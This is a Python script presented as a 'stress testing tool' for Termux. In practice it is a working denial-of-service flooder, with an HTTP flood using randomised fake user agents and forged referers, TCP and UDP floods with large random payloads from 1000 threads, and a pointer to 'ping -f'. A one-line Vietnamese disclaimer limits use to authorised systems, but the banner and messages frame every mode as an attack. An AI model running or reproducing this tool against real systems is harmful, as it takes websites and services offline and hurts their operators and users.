#!/usr/bin/env python3
"""
Khang Termux Layer 7 - Advanced Stress Testing Tool
Chỉ sử dụng trên hệ thống của bạn hoặc có sự cho phép
"""

import asyncio
import aiohttp
import socket
import random
import threading
import time
import sys
import os
import ssl
from concurrent.futures import ThreadPoolExecutor
from fake_useragent import UserAgent
from colorama import Fore, Style, init
import argparse

# Khởi tạo colorama
init(autoreset=True)

class KhangStressTester:
    def __init__(self):
        self.total_requests = 0
        self.failed_requests = 0
        self.success_requests = 0
        self.running = False
        self.ua = UserAgent()
        self.lock = threading.Lock()
        
    def print_banner(self):
        banner = f"""
{Fore.RED}╔══════════════════════════════════════════╗
║        {Fore.WHITE}KHANG TERMUX LAYER 7{Fore.RED}              ║
║    {Fore.YELLOW}Advanced Stress Testing Tool{Fore.RED}        ║
╚══════════════════════════════════════════╝
{Fore.CYAN}• Layer 7 HTTP/HTTPS Flood
{Fore.CYAN}• Layer 4 TCP/UDP Flood
{Fore.CYAN}• Layer 3 ICMP Flood
{Fore.CYAN}• Max: 750,000+ RPS
{Fore.CYAN}• Fake User Agents
{Fore.CYAN}• Multi-threaded Async
{Style.RESET_ALL}
"""
        print(banner)
    
    def get_random_headers(self):
        """Tạo headers ngẫu nhiên"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://www.google.com/',
            'DNT': '1'
        }
    
    async def http_flood(self, target_url, duration, threads):
        """Layer 7 HTTP/HTTPS Flood"""
        print(f"{Fore.GREEN}[+] Starting Layer 7 HTTP Flood...")
        print(f"{Fore.YELLOW}[*] Target: {target_url}")
        print(f"{Fore.YELLOW}[*] Duration: {duration}s")
        print(f"{Fore.YELLOW}[*] Threads: {threads}")
        
        self.running = True
        start_time = time.time()
        
        async def attack_session(session_id):
            session = aiohttp.ClientSession()
            while self.running and (time.time() - start_time) < duration:
                try:
                    headers = self.get_random_headers()
                    async with session.get(target_url, 
                                         headers=headers,
                                         timeout=aiohttp.ClientTimeout(total=5),
                                         ssl=False) as response:
                        with self.lock:
                            self.total_requests += 1
                            if response.status == 200:
                                self.success_requests += 1
                            else:
                                self.failed_requests += 1
                except Exception as e:
                    with self.lock:
                        self.total_requests += 1
                        self.failed_requests += 1
                finally:
                    await asyncio.sleep(0.01)
            await session.close()
        
        # Tạo tasks cho async
        tasks = []
        for i in range(threads):
            task = asyncio.create_task(attack_session(i))
            tasks.append(task)
        
        # Hiển thị thống kê
        await self.show_stats(duration)
        
        # Chờ tất cả tasks hoàn thành
        await asyncio.gather(*tasks)
    
    def tcp_flood(self, target_ip, target_port, duration, threads):
        """Layer 4 TCP Flood"""
        print(f"{Fore.GREEN}[+] Starting Layer 4 TCP Flood...")
        print(f"{Fore.YELLOW}[*] Target: {target_ip}:{target_port}")
        
        payload = random._urandom(1024)  # 1KB random data
        
        def attack():
            while self.running and time.time() - start_time < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((target_ip, target_port))
                    for _ in range(100):  # Gửi 100 packet mỗi connection
                        s.send(payload)
                    s.close()
                    with self.lock:
                        self.total_requests += 100
                        self.success_requests += 100
                except:
                    with self.lock:
                        self.total_requests += 1
                        self.failed_requests += 1
        
        self.running = True
        start_time = time.time()
        
        # Tạo threads
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        # Hiển thị thống kê
        stats_thread = threading.Thread(target=self.show_stats_sync, args=(duration,))
        stats_thread.start()
        
        # Chờ
        time.sleep(duration)
        self.running = False
        
        for t in thread_list:
            t.join(timeout=2)
    
    def udp_flood(self, target_ip, target_port, duration, threads):
        """Layer 4 UDP Flood"""
        print(f"{Fore.GREEN}[+] Starting Layer 4 UDP Flood...")
        
        payload = random._urandom(65507)  # Kích thước UDP max
        
        def attack():
            while self.running and time.time() - start_time < duration:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    for _ in range(50):
                        s.sendto(payload, (target_ip, target_port))
                    s.close()
                    with self.lock:
                        self.total_requests += 50
                        self.success_requests += 50
                except:
                    with self.lock:
                        self.total_requests += 1
                        self.failed_requests += 1
        
        self.running = True
        start_time = time.time()
        
        thread_list = []
        for _ in range(threads):
            t = threading.Thread(target=attack)
            t.daemon = True
            t.start()
            thread_list.append(t)
        
        stats_thread = threading.Thread(target=self.show_stats_sync, args=(duration,))
        stats_thread.start()
        
        time.sleep(duration)
        self.running = False
        
        for t in thread_list:
            t.join(timeout=2)
    
    def show_stats_sync(self, duration):
        """Hiển thị thống kê (sync version)"""
        start_time = time.time()
        last_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            time.sleep(1)
            with self.lock:
                current_total = self.total_requests
                rps = current_total - last_count
                last_count = current_total
                
                sys.stdout.write(f"\r{Fore.CYAN}[STATS] Total: {current_total:,} | "
                               f"Success: {self.success_requests:,} | "
                               f"Failed: {self.failed_requests:,} | "
                               f"RPS: {rps:,}")
                sys.stdout.flush()
        print()
    
    async def show_stats(self, duration):
        """Hiển thị thống kê (async version)"""
        start_time = time.time()
        last_count = 0
        
        while self.running and (time.time() - start_time) < duration:
            await asyncio.sleep(1)
            with self.lock:
                current_total = self.total_requests
                rps = current_total - last_count
                last_count = current_total
                
                print(f"\r{Fore.CYAN}[STATS] Total: {current_total:,} | "
                      f"Success: {self.success_requests:,} | "
                      f"Failed: {self.failed_requests:,} | "
                      f"RPS: {rps:,}", end="", flush=True)
        print()

def main():
    parser = argparse.ArgumentParser(description="Khang Termux Layer 7 - Stress Testing Tool")
    parser.add_argument("--url", help="Target URL (for Layer 7)")
    parser.add_argument("--ip", help="Target IP (for Layer 3/4)")
    parser.add_argument("--port", type=int, help="Target port")
    parser.add_argument("--layer", choices=['3', '4', '7'], default='7', help="Attack layer (3,4,7)")
    parser.add_argument("--time", type=int, default=60, help="Attack duration in seconds")
    parser.add_argument("--threads", type=int, default=1000, help="Number of threads")
    parser.add_argument("--rps", type=int, default=750000, help="Target RPS (max)")
    
    args = parser.parse_args()
    
    tester = KhangStressTester()
    tester.print_banner()
    
    try:
        if args.layer == '7':
            if not args.url:
                args.url = input(f"{Fore.YELLOW}[?] Enter target URL: ")
            asyncio.run(tester.http_flood(args.url, args.time, min(args.threads, 2000)))
        
        elif args.layer == '4':
            if not args.ip:
                args.ip = input(f"{Fore.YELLOW}[?] Enter target IP: ")
            if not args.port:
                args.port = int(input(f"{Fore.YELLOW}[?] Enter target port: "))
            
            print(f"{Fore.CYAN}[1] TCP Flood")
            print(f"{Fore.CYAN}[2] UDP Flood")
            choice = input(f"{Fore.YELLOW}[?] Select attack type (1/2): ")
            
            if choice == '1':
                tester.tcp_flood(args.ip, args.port, args.time, args.threads)
            else:
                tester.udp_flood(args.ip, args.port, args.time, args.threads)
        
        elif args.layer == '3':
            print(f"{Fore.RED}[!] Layer 3 attack requires root privileges")
            print(f"{Fore.YELLOW}[*] Use: ping -f {args.ip} (with root)")
        
        print(f"{Fore.GREEN}[+] Attack completed!")
        print(f"{Fore.CYAN}[+] Total requests: {tester.total_requests:,}")
        print(f"{Fore.CYAN}[+] Successful: {tester.success_requests:,}")
        print(f"{Fore.CYAN}[+] Failed: {tester.failed_requests:,}")
        
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Stopped by user")
    except Exception as e:
        print(f"{Fore.RED}[!] Error: {e}")

if __name__ == "__main__":
    # Kiểm tra quyền và dependencies
    if os.name != 'posix':
        print(f"{Fore.RED}[!] This tool is designed for Termux/Linux")
        sys.exit(1)
    
    try:
        import aiohttp
        import fake_useragent
        import colorama
    except ImportError:
        print(f"{Fore.YELLOW}[*] Installing dependencies...")
        os.system("pip install aiohttp fake_useragent colorama")
        print(f"{Fore.GREEN}[+] Dependencies installed!")
    
    main()
